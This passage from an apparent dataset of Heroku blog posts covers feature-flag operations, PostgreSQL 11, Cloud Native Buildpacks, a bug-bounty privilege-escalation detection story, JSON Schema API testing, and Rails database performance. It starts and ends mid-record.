around visibility. Whether it has a lot of pretty graphics or just some command line output, having a way to display the different places where you're storing the state for your buttons and switches and combining it into one comprehensible place is really important for incident operations. Really consider how much work it will take to figure out if a switch is flipped or not, because in general, the fancier and more sophisticated your switch is, the more likely it is to become part of the problem! You should also be routinely testing whether these switches are actually working. Does it actually work? You can’t have the confidence to know that it will work until you've tried it. With the variety of techniques listed above, you will want to carefully consider how you form these safeguards and where you store their state. There are a number of options available: in a relational database, a data caching layer, as environment variables, etc. You can even have configurations in your code as a last resort if you believe that a way to control for failure is a fresh deploy. Consider whether flipping a switch would require access to a component that could be down. If that switch requires access to a running production server and you can't communicate to that server, what happens? How might you change the behavior of your application if you can't deploy changes? If you have an immutable infrastructure, that might mean environment variables are totally out of the question for handling certain failure cases. One of the reasons why we rely so heavily on databases for storing our application state is because we have high confidence that we can retain access to the database in order to manually run SQL statements to toggle those safeguards. What this boils down to is this: the more configurable you make your application at runtime, the less confident you can be that it will work in predictable ways. Have you tested how a certain user, when flagged into three features, interacts with all of your services? As you implement these knobs and buttons, keep in mind that you are trading knowledge for control. However, it's still a better deal at the end of the day. More control over mitigating issues in the app is better than confidently knowing the exact and particular way an app is down, but having no way to do anything about it. ops feature flags rails ruby", "date": "2019-03-20,"},
{"website": "Heroku", "title": "PostgreSQL 11 Generally Available on Heroku", "author": ["Becky Jaimes"], "link": "https://blog.heroku.com/postgresql-11-general-availability", "abstract": "PostgreSQL 11 Generally Available on Heroku Posted by Becky Jaimes March 21, 2019 Listen to this article After a successful two-month Beta period, PostgreSQL 11 is now the default version for all new provisioned Heroku Postgres databases. All Postgres extensions, tooling, and integration with the Heroku developer experience are ready to use, giving you the power of PostgreSQL 11 with the ease and usability of Heroku for building data-centric applications. We'd like to re-emphasize a few features - among the many released in Postgres 11 - that we are particularly excited about. Native Table Partitioning Additions Introduced in Postgres 10, native table partitioning enables more performant queries, data segmentation and faster access to large growth tables. In Postgres 11, native table partitioning features have been expanded to now include default partitions, foreign table inheritance for partitions, and general support for primary keys, foreign keys, indexes, and triggers. A pattern we often see in databases in our fleet is one or two tables growing at a rate that’s much larger and faster than the rest of the tables in the database. Query times within the application will start to rise, bulk loads will take longer, and creating indexes can take a long time. Making use of patterns such as Year/Month (YOMO) and Hash Key partitions have been streamlined in Postgres 11. Even without explicitly setting partitions, Postgres 11 will perform default partitioning to improve baseline query performance without any additional steps from creating tables. Postgres table partitioning can be a great way to maintain good query performance for very large tables by partitioning what is logically one big table into smaller physical pieces. You can visit Postgres 11 Partitioning to dive deeper into the enhancements. Introduction of Stored Procedures Postgres has long supported functions to handle more complex workloads. Functions have, unfortunately, the drawback of not supporting transactions. Postgres 11 introduces Stored Procedures, bringing closer feature parity to the SQL standard and enabling Postgres users to trigger ACID data manipulation. You can visit Postgres 11 Stored Procedures to learn more. Parallelized Indexing and Joining Improvements Postgres 11 includes improved parallelism for more types of joins, scans, indexing and queries. A notable example is the addition of parallelism to the CREATE INDEX command that generates B-tree indexes. B-tree indexes are now able to use additional columns as \"non-keys\" in the index scans. This means that querying additional columns not in your B-tree index can still utilize that same B-tree index for faster query times on these tables. The biggest improvement in parallel joins, now scales significantly across multiple tables, indexes and data types for some of the heaviest, most complex usage out there.  Execution plans and analytics for queries that perform aggregation across many tables will see much more efficient use of the database and faster turnarounds because of the fully-integrated CPU utilization now added in Postgres 11. Customer Success Spotlight: Quikly Many Heroku customers are already taking advantage of Postgres 11's features to better work with advanced data use cases. Heroku customer Quikly is an engagement marketing platform that is using Postgres 11's native table partitioning to deliver insights from time series data to its customers and internal product teams— “We wanted to store a lot of time-series data from events on our platform in order to provide client-facing reports on campaign performance as well as provide some behavioral analytics to our internal product team. We capture a stream of events from our platform and use Postgres 11’s native partitioning along with pg_partman to partition our \n events table by month. Anytime we query over events during a period of time, Postgres can efficiently scan just the tables it needs  and the indexes remain small and fast, even with a large dataset. We were able to use use follower databases to test out a few different database schemas with production data before settling on one that worked best and roll it out without any downtime. As our data set grows or our queries get more complex, we know it’s painless to scale up to more storage and performance.”\n—Scott Meves, Chief Technology Officer, Quikly Get Started Today If you want to try out the new version, it's is as simple as provisioning a new database: $ heroku addons:create heroku-postgresql -a sushi\n\n$ heroku pg:info DATABASE_URL -a sushi\n=== DATABASE_URL\nPlan:                  Hobby-dev\nStatus:                Available\n...\nPG Version:            11.2\n... If you have an existing database on the platform, we encourage you to look into upgrading your Postgres version: see our documentation for upgrading . For further details about other new features in PostgreSQL 11, please see the PostgreSQL documentation . Let us know what you think at postgres@heroku.com . sql postgres database", "date": "2019-03-21,"},
{"website": "Heroku", "title": "Turn Your Code into Docker Images with Cloud Native Buildpacks", "author": ["Terence Lee", "Joe Kutner"], "link": "https://blog.heroku.com/docker-images-with-buildpacks", "abstract": "Turn Your Code into Docker Images with Cloud Native Buildpacks Posted by Terence Lee and Joe Kutner April 03, 2019 Listen to this article When we open-sourced buildpacks nearly seven years ago, we knew they would simplify the application deployment process. After a developer runs git push heroku master , a buildpack ensures the application's dependencies and compilation steps are taken care of as part of the deploy. As previously announced , we've taken the same philosophies that made buildpacks so successful and applied them towards creating Cloud Native Buildpacks (CNB), a standard for turning source code into Docker images without the need for Dockerfiles. In this post, we'll take a look at how CNBs work, how they aim to solve many of the problems that exist with Dockerfile, and how you can use them with the recent beta release of the buildpacks.io project . As part of this release, we’ve created a Heroku buildpacks builder image for Ruby, Node.js, Java, Python, PHP, and Go that works with the CNB tooling. Let’s start by creating a strawman. We’ll walk through some of the tedious but essential steps necessary to create a Dockerfile for a Ruby on Rails app. A Leaky Abstraction: Incrementally Writing a Dockerfile Most developers use Docker by creating a Dockerfile , which defines a build process that generates a Docker image. For example, let's say you have an existing Rails project you want to deploy as a Docker container. You'll need to start from a base Ruby image, and include additional packages that are necessary for the application to run. If you've never used Docker before, you probably have to learn several things just to get this far: FROM ruby\nRUN apt-get update -qq \\\n  && apt-get install -y nodejs libpq-dev build-essential\nCOPY . /app\nWORKDIR /app\nRUN bundle install\nRUN bundle exec rake assets:precompile\nEXPOSE 5000\nCMD bin/rails s In addition to Ruby, a Docker image for a Rails app also needs several additional Apt packages. It must include the nodejs runtime in order to run the necessary tooling to precompile assets, libpq-dev is required for communicating with a Postgres database, and build-essential is required for gcc to build native extensions for several Ruby gems. This Dockerfile is enough to run a simple Rails application in production, but the image will be bloated with extraneous cache directories. You might want to reduce the image size by removing those files, which are only useful for sequential local builds: RUN apt-get update -qq \\\n  && apt-get install -y nodejs libpq-dev build-essential \\\n  && apt-get clean autoclean && apt-get autoremove -y \\\n  && rm -rf /var/lib/apt /var/lib/dpkg /var/lib/cache /var/lib/log\n# ..\nRUN bundle exec rake assets:precompile\n  && rm -rf /app/tmp/cache/assets/ This highlights one of the shortcomings of Dockerfile when it comes to speed. It can’t properly make use of those cache directories because a rebuild takes everything or nothing. However, there are some clever tricks you can use to speed up builds by caching information about dependencies. Instead of copying the entire app in at once, you can selectively add files like this: ADD Gemfile /app/\nADD Gemfile.lock  /app/\nRUN bundle install Copying the Gemfile and Gemfile.lock works around the Dockerfile caching mechanism to prevent invalidating your entire cache when you change a single line of code. These examples highlight just a few of the challenges you’ll face when constructing a Dockerfile for your app. You’ll need to repeat those challenges for every app that requires a Dockerfile . Oftentimes, you’ll end up copying and pasting sections of Dockerfile s from one app to another, which is a recipe for a maintenance nightmare. Maintenance is the biggest shortcoming of Dockerfile . Aside from copy-pasting code, it introduces lower level concerns that you wouldn’t need to worry about without it. For instance, Ruby, as with many languages, has several base images you can inherit from, and each one comes with its own size and security considerations. If, one day, the Rails ecosystem requires a new dependency that isn't included in your existing Dockerfile , you are responsible  for updating the configuration as needed. If you've broken your project out into microservices, that could also mean updating several files across multiple locations. Ultimately, Dockerfile is a leaky abstraction. It forces developers to be aware of operational and platform concerns that were previously abstracted away. To write a good Dockerfile , you must understand the underlying mechanisms and how each step of the image generation process works in order to properly handle future updates. All of these problems stem from Dockerfile 's lack of app awareness. Without context about your application or the frameworks you use, there's a giant mismatch between how a developer builds an application and the tools they use to deploy that app. Mixing operational concerns with application concerns like this results in a poor tool for developers who just want to write code and ship it as painlessly as possible. Given these deficiencies, let’s take a look at an alternative to reduce this complexity. Learning From Buildpacks If you've ever deployed an application using Heroku, you know that it's as easy as running git push heroku master in your local directory. Behind the scenes, a buildpack retrieves dependencies, processes assets, handles caching, and compiles code for whatever language your app is built in. For example, consider a Rails application. The Ruby buildpack will install Ruby and bundler . Your gem dependencies are fetched, your assets are compiled, and the cache is cleaned up: $ git push heroku master\nremote: Compressing source files... done.\nremote: Building source:\nremote: -----> Ruby app detected\nremote: -----> Compiling Ruby/Rails\nremote: -----> Using Ruby version: ruby-2.6.0\nremote: -----> Installing dependencies using bundler 1.15.2\nremote:        Running: bundle install --without development:test --path vendor/bundle --binstubs vendor/bundle/bin -j4 --deployment\n...\nremote:        Bundle complete! 18 Gemfile dependencies, 61 gems now installed.\nremote:        Gems in the groups development and test were not installed.\nremote:        Bundled gems are installed into `./vendor/bundle`\nremote:        Removing bundler (1.15.2)\nremote:        Bundle completed (42.62s)\nremote:        Cleaning up the bundler cache.\n...\nremote:        Asset precompilation completed (3.72s)\nremote:        Cleaning assets\nremote:        Running: rake assets:clean\nremote: -----> Detecting rails configuration\nremote: -----> Compressing...\nremote:        Done: 41.3M\nremote: -----> Launching...\nremote:        Released v6\nremote:        https://myapp.herokuapp.com/ deployed to Heroku\nremote:\nremote: Verifying deploy... done. A buildpack automatically handles all these steps for you by recognizing the conventions of your application's language. Buildpacks were designed to configure whatever is necessary to run your application. With Cloud Native Buildpacks, we wanted a similar system that allowed developers to focus on their app and not piece together a build pipeline, while taking advantage of Docker and modern container standards. Running Cloud Native Buildpacks The desire to combine the simplicity and usability of buildpacks with the benefits of containers led us to develop Cloud Native Buildpacks (CNB), which produce an OCI-compliant image that works with existing Docker tooling and the broader container ecosystem. The buildpacks.io project is the home of the open source tooling that makes our vision possible. The first of these tools is pack build , which behaves in much the same way as git push heroku master . You can run it against any arbitrary repository and it will produce a Docker image. Here's an example of running the Heroku Cloud Native Ruby buildpack against a Rails app: Much like buildpacks that produce execution-ready slugs, a CNB will identify what is necessary to install based on the existing files in your project. There is no configuration necessary to identify your application's requirements. Since the buildpack is app-aware and knows the precise languages and dependencies your app uses, the build phases also come with sane defaults for memory performance and handling concurrency. The steps that a CNB process undertakes to produce the final image are very similar to the stages for existing Heroku buildpacks: The CLI detects the primary language of your project. For example, if your source code directory has a Gemfile , the CNB will identify it as a Ruby project; a pom.xml file identifies it as a Java project, and so on. The execution environment then analyzes a previous build to determine if there are any steps which can be reused in a subsequent build. The CNB runs the build, downloading any dependencies and preparing the application to run in production. Finally, it exports the result of that build as a Docker image. The underlying processes to generate the image are handled behind-the-scenes by the buildpack. If this process needs to be updated—such as when a vulnerability is detected—you can easily fetch a new toolchain and rebuild an image using pack rebase , which will update your image in less than a second without rebuilding. This saves an enormous amount of time compared to rebuilding from a Dockerfile on every one of your apps--a process that can take hours. Try Cloud Native Buildpacks Today There’s no better time to give Cloud Native Buildpacks a try than right now. The project has reached its first Beta release , and it’s ready for you to use and provide feedback. To get started, download the pack CLI and use one of our buildpacks (Ruby, Node.js, Java, Python, PHP, or Go) in your app source directory: $ pack build --builder heroku/buildpacks <docker image name> Come join us on Slack . We also have API documentation available that defines the buildpack spec if you'd like to generate your own OCI images. Heroku has always found it important to meet developers where they are: at their application's source code. We believe that Cloud Native Buildpacks reduce the operational complexity with building container-based applications and frees developers up to focus on building great features for their users. Docker buildpacks", "date": "2019-04-03,"},
{"website": "Heroku", "title": "Bug Bounties and Black Swans: How Heroku Expects the Unexpectable", "author": ["Wade"], "link": "https://blog.heroku.com/bug-bounties-black-swans", "abstract": "Bug Bounties and Black Swans: How Heroku Expects the Unexpectable Posted by Wade March 26, 2019 Listen to this article There’s obviously more to security than humans, technology, and vendors with all of their implementations and expertise. At Heroku we believe that security is a byproduct of excellence in engineering. All too often, software is written solely with the happy path in mind, and security assurances of that software has its own dangerous assumptions. A mature security program should challenge assumptions of security controls, move to testing continuously, and prepare for the unexpectable. This means asking hard questions about the bigger picture. Think bigger than the development lifecycle, backing away from the fixations of confirming effective corrections and remediations.  This means taking the time to imagine, to discover scenarios accounting for the unknown and unknowable. Let’s explore a few concepts that prepared Heroku last year for the unknown, and the bug bounty researcher from Bugcrowd that helped us detect and implement a mitigation well before a patch was released. This is ultimately a harmony between threat modeling and partnership with the bounty-based research community. On Threat Modeling Let’s start with some important threat modeling concepts. Last year I had the privilege of teaching a threat modeling class at Kiwicon with my good friend Mark Piper of Insomnia Security in which we explored thought processes necessary to create a threat model addressing unknown gaps and issues. The following three are imperative to aid in future-proofing against vulnerabilities: challenging assumptions, attackers' budgets and bosses, and expecting the unexpected. Challenge Your Assumptions When designing and engineering software, there are certain security assumptions made regardless of what you are building. Whether that’s isolation of processes, segregation of roles, the basics of authentication, or use of well known encryption protocols, all of these provide their own form of security. However, every “safe” security decision can also become an attack vector. In order to challenge your assumptions about what is safe by default, endeavor to perform automated testing for misconfigurations, confirm the design is adequate, seek external third-party assurance with security testing, and plan for failures. Attackers Have Budgets and Bosses Gone are the days in which the majority of those attacking can be described by the “curious hacker” category. Today, almost all attackers are financially motivated, regardless of the color of their hats: from the malicious (organised crime groups, nation states, corporate espionage) to the helpful (security researchers working with bug bounty programs, or trying to make a name for themselves in the industry), you should assume that they mean business. Think about it like this: your attackers likely are as well-equipped as you are. They have bosses, budgets, roadmaps, and sometimes even project schedules, code repositories, and documented playbooks. Expect the Unexpected You may have performed some form of security review, created a threat model, and had testing performed to gauge the security of the software you are writing and implementing. You may even have found vulnerabilities that you had not anticipated that you have now remediated. There may be a digital pot of gold at the end of that rainbow. But what about the things you can’t actually plan for? What happens if there is a flaw in the encryption protocol you’ve chosen to use? How do you handle the release of a new kernel vulnerability? How do you handle an issue that is only known to an attacker that has just discovered the exploitable issue and has decided you are a worthy target for its use? The Black Swan There is a concept known as a black swan event , in which no amount of planning or preparation can predict the unexpected. The history behind this concept is fascinating. While originating in 2nd Century Rome under the assumption that black swans did not exist, the phrase became commonly used in 16th century London to describe an unlikely or impossible occurrence. In 1697, a Dutch captain sailed to Australia and encountered a black swan for the first time, thereby establishing the irony that the phrase now captures. In short, a black swan event is an event that has low predictability, is perceived as nearly zero likelihood, and yet has high consequences. In the information security realm, a prime example would be the use of a 0-day exploit. Since only the person or team that discovered it knows about it, there seems to be no way to accurately predict when or against what such an exploit may be utilised. As a result, mitigating against a black swan event means you must plan for resiliency for when the unexpected (inevitably) arises. A Black Swan Story One morning, an alert fired in the form of a direct page for the Data team here at Heroku. They have built instrumentation in the control plane for the Heroku Postgres servers to detect any form of privilege escalation to a superuser role. (note: we’ve stated before that security starts with excellence in engineering -- this is a perfect example, this type of virtuosity in managing the data fleet was done by the engineering team at their own volition.) Following protocol, the Data team looped in our security team, had the instance isolated within 17 minutes of the privilege escalation, the user locked down, and they aided us in investigating what else the user may have been doing. In investigating the issue, we determined that the user was very likely a security researcher, not a malicious actor, and via the email address he had used to sign up for his Heroku account, we were able to contact him and ask if he had been performing some action that might have resulted in the elevation of privilege we had seen. The researcher, Andrew Krasichkov, aka buglloc, replied quite quickly, confirming that he was in fact performing research utilising our platform that resulted in this escalation, in the form of a Postgres vulnerability in the dblink and postgres_fdw extensions, and was pleased and a little shocked at the speed that we had been able to identify and respond to this type of attack. Being part of our bug bounty program through Bugcrowd , we of course rewarded Andrew and continue to work with him. Bug Bounties Because we encourage security research against our platform, combined with the fact that we were able to detect and respond in this manner, we were able to work directly with Andrew to understand his finding. In that way, we were able to proactively defend against this previously unknown flaw even before a patch was available. Having this kind of relationship with researchers is exactly why we love bug bounties. It’s also a way into our industry for many new researchers: if they show the drive and desire as well as the basic knowledge required to continue digging, we work with them to reward their discovery of high quality issues, brought to our attention in a responsible way. With a bug bounty, they get to be their own boss, and can continue doing this work and improving at it. It's a fantastic supplement to the work we perform and our third party security assessments. Without this program, we’d have much more work challenging our assumptions safely – in this case, an assumption that a user won't be able to escalate to a superuser role. Instead, this black swan event was one we were able to deal with quickly and effectively, and it’s a huge part of why we love the research community that we interface with through Bugcrowd . bugcrowd bug bounty bug postgres security", "date": "2019-03-26,"},
{"website": "Heroku", "title": "Saved by the Schema: Using JSON Schema to Document, Test, and Debug APIs", "author": ["Jessie Young"], "link": "https://blog.heroku.com/json-schema-document-debug-apis", "abstract": "Saved by the Schema: Using JSON Schema to Document, Test, and Debug APIs Posted by Jessie Young April 09, 2019 Listen to this article Heroku has many public API endpoints. Each of these endpoints needs to be tested so that we know how they work, and documented so that our customers (and other API consumers) know how they work. Follow along, and we’ll learn how Heroku uses JSON Schema to test and document our Platform API – and how it helped us uncover an unexpected bug, rooted in the way the Oj gem parses Big Decimals. JSON Schema files are like blueprints that define the structure and semantics of other JSON documents. When a JSON Schema file is applied to a JSON document, you can determine whether the document is valid (conforms to the schema) or is invalid (does not conform to the schema). So how do we at Heroku use JSON Schema to document and test our public API? Documenting APIs with JSON Schema One of the most important parts of maintaining a public API is making sure that the documentation is always up to date. One way Heroku’s engineering team ensures that our public API docs are correct is a rake task invoked by our CI service. The rake task checks for any changes to JSON schema files in the current branch. If there are changes, it uses prmd to translate those updated JSON schema files into a markdown file. When the changes are deployed, that markdown file is published as our public Platform API Reference . Testing APIs with JSON Schema Documenting API endpoints via JSON Schema is better than updating docs in a manual, ad-hoc manner, but this process does not ensure that the docs are accurate. To verify the accuracy of the docs generated by JSON Schema files, API requests and responses must be validated against the JSON Schema files. In the Platform API’s test suite, we use the committee gem to see that JSON responses from our API match the structure of the corresponding JSON Schema files. If the test for an endpoint passes the assert_schema_conform method provided by the committee gem, we know that our API requests and responses match the definitions in JSON Schema. If the test fails assert_schema_conform , we know that we either need to change our JSON Schema definitions or we need to update the API endpoint itself to match the corresponding JSON Schema file. When we at Heroku started testing our API with committee it immediately uncovered some inconsistencies between the existing JSON Schema files and what various API endpoints actually returned – and it turns out to be a gift that keeps giving. Finding and Fixing an API Edge Case With JSON Schema One challenge of writing tests, in general, is writing tests that sufficiently cover all real life edge cases. Writing tests that compare API responses and JSON Schema files are no exception. Recently, I was working on a feature for our Heroku Enterprise users which allows them to retrieve monthly or daily usage data for their accounts or teams. We were doing some initial curl requests of the new endpoints when we noticed something strange: when the dyno usage value was a decimal number, it was a string. When the dyno usage value was an integer, it was a number. In our API docs, I saw that the dynos value was defined as a number. Because our API docs are generated from JSON Schema, I knew the docs were probably reflecting our JSON Schema files. I went back to our JSON Schema file for the endpoint, which included the following definition: \"dynos\": {\n  \"description\": \"dynos used\",\n  \"example\": 1.548,\n  \"readonly\": true,\n  \"type\": [\n    \"number\"\n  ]\n} So, according to the JSON Schema definition, we should have expected a number. To test what I was seeing in my curl requests, I wrote a new test for a team where the dyno usage was a number with many decimal places. When I ran the new test using the committee gem’s assert_schema_conform method, I got the following error: Failure/Error: assert_schema_conform\n\n     Committee::InvalidResponse:\n       Invalid response.\n\n       #/0/dynos: failed schema #/definitions/team-usage/properties/dynos: For 'properties/dynos', \"1967.4409999999837\" is not a number. Good news! I reproduced what I was seeing in production: sometimes, the dynos value came back as a string (number in quotes) rather than a number as we expected. Just to make sure, I ran the old test (for a team where the dyno usage was an integer), and the assert_schema_conform check passed. So in that case, the dynos value was a number like  the schema expected. Good news again! I reproduced the case where the dynos value was a number. Now to figure out why.... Because both responses were passing through the same serializer, the only possible answer was that something was happening in the JSON parsing of these values. In our endpoints, we serialize responses and then call MultiJson.dump(object) . MultiJson is just “a generic swappable back-end for JSON handling” so in order to debug further I needed to look at which parsing adapter we were using. In our case, it was Oj . In an irb session, I ran the following: require 'multi_json'\n=> true\n MultiJson.use :oj\n=> MultiJson::Adapters::Oj\nMultiJson.load('0').class\n=> Integer\nMultiJson.load('1967.44').class\n=> Float\nMultiJson.load('1967.4409999999837').class\n=> BigDecimal That all looks as expected. But when digging further, my issue became more obvious: MultiJson.dump(MultiJson.load('0'))\n=> \"0\"\nirb(main):002:0> MultiJson.dump(MultiJson.load('1967.44'))\n=> \"1967.44\"\nMultiJson.dump(MultiJson.load('1967.4409999999837'))\n=> \"\\\"1967.4409999999837\\\"\" Bingo! MultiJson is parsing numbers with many decimal places (a BigDecimal) differently from other numbers (note the extra set of quotes around the return value). After looking through the Oj repo, I found the following comment from the maintainer: the json gem and Rails use a string format for BigDecimal. Oj now does its best to mimic both so it now returns a string as well. Although our API does not run on Rails, I was interested to know why Rails parses BigDecimals as strings. From the docs : A BigDecimal would be naturally represented as a JSON number. Most libraries, however, parse non-integer JSON numbers directly as floats. Clients using those libraries would get in general a wrong number and no way to recover other than manually inspecting the string with the JSON code itself. That’s why a JSON string is returned. The JSON literal is not numeric, but if the other end knows by contract that the data is supposed to be a BigDecimal, it still has the chance to post-process the string and get the real value. In short, Oj parses BigDecimals as strings because Rails parses BigDecimals as strings. And Rails parses BigDecimals as strings to allow greater specificity. If our API endpoint wanted to have the greatest level of specificity possible, it’s likely we would have kept this default behavior and perhaps cast all values of this field as strings. While it is possible to define a field in JSON Schema as being either a string or a number, doing so would not be desireable in terms of API design. This is because it is good API design to always return the same data type for a given value (i.e., the API consumer may not always know which number they will receive, but they know it will always be a number rather than a string, array, hash, etc.). Floating point numbers in Ruby are limited to a precision of 15 decimal places and, for the dyno value in this API endpoint, 15 decimal places was plenty, so casting as a float was fine. To prevent Oj from casting BigDecimals as strings, we updated our app’s MultiJson config to: MultiJson.use :oj\nMultiJson.load_options = {\n  bigdecimal_load: :float,\n} And when I re-ran the assert_schema_conform test for a team with a BigDecimal dyno value, it passed, so I knew that our schema, and therefore our docs, were reflecting the real returned values from our API. Heroku’s use of JSON Schema, prmd, and the committee gem made it easy to test, validate, and document that the API was now parsing BigDecimals as floats rather than strings. oj test documentation api json schema ruby", "date": "2019-04-09,"},
{"website": "Heroku", "title": "Optimizing Database Performance in Rails", "author": ["Jonan Scheffler"], "link": "https://blog.heroku.com/rails-database-optimization", "abstract": "Optimizing Database Performance in Rails Posted by Jonan Scheffler April 15, 2019 Listen to this article Setting up a database is a relatively straightforward process (Heroku has an add-on for that ), but getting it to run well in production is sometimes another matter. As your application grows and your data grows along with it, you will likely find a number of performance bottlenecks specifically related to your database, and this post aims to help you diagnose and address those issues when they arise. As with all components of your infrastructure it’s important to have early visibility into the performance characteristics of your database. Watching this data as your application grows will give you a much better chance of spotting performance issues and regressions as they’re introduced. I always recommend to customers they install a monitoring tool immediately after setting up their application. A monitoring serivce can give you all sorts of insight into your app; things like response time, error tracking, or a large set of database-specific features. Nearly all of my performance investigations start with identifying slow queries, or views that are running far more queries than are necessary. Most of the time these queries are the primary factor in slowing down their application, so much so that it makes little sense to spend effort improving the performance of their code, as any gains would be minor compared to the benefits of good database management. Heroku Postgres Standard and Premium databases provide database related events that can be viewed on the app's logstream using heroku logs . Postgres alerts are prefixed with [postgres] while Heroku Postgres Metrics events will be prefixed with [heroku-postgres] . Metrics events include things like database size, active connections, and cache hit rate to see how often queries are hitting disk. Identifying Slow Queries data.heroku.com provides insight into slow queries that may be impacting the performance of your application. Selecting the database and navigating to the Diagnose tab will display queries for each of these categories: Most time consuming Most frequently invoked Slowest execution time Slowest I/O Using the pg-extras Heroku CLI plugin provides additional commands for diagnosing a Postgres database. The pg:outliers command will identify the longest executing queries. Here's an example of pg:outliers output from the database for CodeTriage . $ heroku pg:outliers\n total_exec_time | prop_exec_time |   ncalls   |  sync_io_time   |                                                                                                                            query                                                                                                                             \n-----------------+----------------+------------+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n 00:27:41.4331   | 32.9%          | 36,118     | 00:00:00.038514 | SELECT  \"repos\".* FROM \"repos\" INNER JOIN \"repo_subscriptions\" ON \"repo_subscriptions\".\"repo_id\" = \"repos\".\"id\" WHERE (repos.id not in ($2)) GROUP BY repos.id ORDER BY issues_count::float/COUNT(repo_subscriptions.repo_id) DESC LIMIT $1\n 00:08:12.72007  | 9.8%           | 16         | 00:06:45.137798 | UPDATE \"issues\" SET \"state\" = $1 WHERE (state = $2 and updated_at < $3)\n 00:07:55.436261 | 9.4%           | 5,921,363  | 00:03:41.310037 | SELECT  \"doc_methods\".* FROM \"doc_methods\" WHERE \"doc_methods\".\"repo_id\" = $1 AND \"doc_methods\".\"name\" = $2 AND \"doc_methods\".\"path\" = $3 ORDER BY \"doc_methods\".\"id\" ASC LIMIT $4\n 00:05:33.412632 | 6.6%           | 14,157,660 | 00:00:00.075173 | SELECT  \"users\".* FROM \"users\" WHERE \"users\".\"id\" = $1 LIMIT $2\n 00:03:56.203844 | 4.7%           | 3,002,492  | 00:00:34.84346  | UPDATE \"issues\" SET \"state\" = $1, \"updated_at\" = $2 WHERE \"issues\".\"id\" = $3\n 00:03:35.423045 | 4.3%           | 25,586     | 00:03:29.169686 | SELECT  \"issue_assignments\".* FROM \"issue_assignments\" INNER JOIN \"repo_subscriptions\" ON \"issue_assignments\".\"repo_subscription_id\" = \"repo_subscriptions\".\"id\" WHERE \"repo_subscriptions\".\"user_id\" = $1 AND \"issue_assignments\".\"delivered\" = $2 LIMIT $3 For more information, please check out the Expensive Queries Dev Center article . In the Rails world you can easily make your database do unnecessary work with approaches like this: clients = Client.limit(10)\n\nclients.each do |client|\n  puts client.address.postcode\nend This code will run 11 queries; one to find the 10 clients and 10 more as it fetches the postcode from the address for each client. If you know you’re going to be iterating over a collection of records to get associated data, use the ActiveRecord includes method to get all of the information you’ll need from a single query. clients = Client.includes(:address).limit(10)\n\nclients.each do |client|\n  puts client.address.postcode\nend Now the query to fetch the initial clients will also include the addresses, so our previous 11 queries just became two: SELECT * FROM clients LIMIT 10;\nSELECT addresses.* FROM addresses\n  WHERE (addresses.client_id IN (1,2,3,4,5,6,7,8,9,10)); Make sure you’ve made a first pass through your code at this point to pick up the low-hanging fruit. These types of queries can significantly impact the performance of your application. Add Indexes to Improve Query Time If you’ve made sure you’re doing your best to generate an efficient query with ActiveRecord and you’re still finding that a specific query is slow, you may benefit from adding an index. Even if you’ve never added an index you’re already using this feature of your database. The primary key column will always use an index that's generated by the database. As you insert records into your database they’re each assigned sequential IDs, but you can’t necessarily depend on the sorted nature of those numbers when you go to look up a record; they can easily be rearranged. When you create a new table the database will automatically create a sorted index of those IDs, which allows us to use much more efficient ways to find those records quickly. The same is true of an index on any column. If you know you’re going to be looking up clients by their first names a lot you will definitely want those names sorted alphabetically. Indexes work best on data when you have fewer unique values, you wouldn’t want to try to index a column like client.notes where you keep content that you’ll rarely use to find records. While storage space is becoming less of a problem these days you do need to consider the fact that adding an index will add some space on disk. The other downside to using indexes is that new writes will happen in two places; a new client will need to have their first name written to the clients table as well as the first name index. For write-heavy models you may not benefit from having an index, and it could actually slow your database down. If you’re considering using an index your best bet is always to try it locally and do some benchmarking. You might find the pghero gem useful for identifying potential targets, it will present recommended indexes in the dashboard. Adding an Index in Rails The easiest way to make sure you’re indexing properly is to let Rails do it for you. If you’re out to add a new column and you want an index you’ll want to use a command similar to this one: $ rails generate migration AddPartNumberToProducts part_number:string:index That command will generate a migration that looks like this: class AddPartNumberToProducts < ActiveRecord::Migration[5.0]\n  def change\n    add_column :products, :part_number, :string\n    add_index :products, :part_number\n  end\nend ActiveRecord will add the part_number column to the products table and then create a separate index for the part_number attribute. When you’re creating a new model in Rails and you know it’s going to have a reference to another model, you’ll almost always want an index on that foreign key, so you can create the relationship with a reference to automatically generate the index. $ rails generate migration AddUserRefToProducts user:references class AddUserRefToProducts < ActiveRecord::Migration[5.0]\n  def change\n    add_reference :products, :user, foreign_key: true\n  end\nend Caching Caching the results from your database queries is vitally important to a production web application. It’s very unlikely that you’re reading new information every time your app queries the database. Imagine you have a user profile page, and every time the user reloads their own profile page it generates a new query, or more likely many queries, especially if you’re just getting started with your optimization adventures. There are certain to be large portions of the data retrieved from that query that don’t change very often, if at all. Wouldn’t it be lovely if we weren’t making round trips to the database for all of that information? Let’s setup caching in Rails. Rails Caching with Redis When you’re caching the data for your profile page you’re going to need a fast place to store it. There’s no point in caching if it isn’t significantly faster to retrieve something from the cache than it is to go to the database. Redis is a perfect choice as it’s incredibly fast to read from a redis cache store, and Rails will work with Redis out of the box. Add the redis gem to your Gemfile : gem 'redis' We’re going to add the hiredis gem as well, it’s a faster connection library that will improve performance: gem 'hiredis' Now we still need to tell Rails to start using our cache store, so we’re going to add this to our production.rb file: config.cache_store = :redis_cache_store, { url: ENV['REDIS_URL'] } There are many options for the configuration of caching that I’ve left out here for simplicity, but if you’re going to run in production you’ll probably want something more complex. You can find details in the RedisCacheStore section of the Rails guide on caching . Once you deploy your application to production you'll want to be using a dedicated Redis instance for caching. Redis only clears the cache when it runs out of space or a record is updated, so it's possible you'll fill your Redis instance to capacity. This is obviously not ideal if you're trying to store other data in Redis that your application uses regularly. If you're using the Heroku Redis add-on the REDIS_URL from the example above will be set automatically, otherwise you'll want to make sure you set the environment variable yourself. Now that you have your caching up and running in production it's time to put it to use. There are three types of caching that all provide unique benefits and disadvantages. We're going to be addressing fragment caching here as it's the easiest strategy to use and it can provide a lot of value without much setup, but if you'd like to investigate other approaches you can read more about them in the Rails Guide to caching . Fragment caching is so named because you can use it to cache an individual fragment of view logic. This allows you to have separate caches that can be independently invalidated for each of the view fragments that make up your page. Rails makes fragment caching especially convenient with the cache block: <% @products.each do |product| %>\n  <% cache product do %>\n    <%= render product %>\n  <% end %>\n<% end %> The next time your application processes a request for the products to be displayed on a particular page Rails will write a cache entry that includes the updated_at attribute for each record. As the records are updated Rails will check to see if the data it's retrieving from the cache has gone stale, and if necessary refresh the cache. Rails will also invalidate the cache if the HTML for a particular view fragment changes, so you can be sure you're always seeing what you expect. If you find cause to be caching a fragment conditionally you can also use the cache_if and 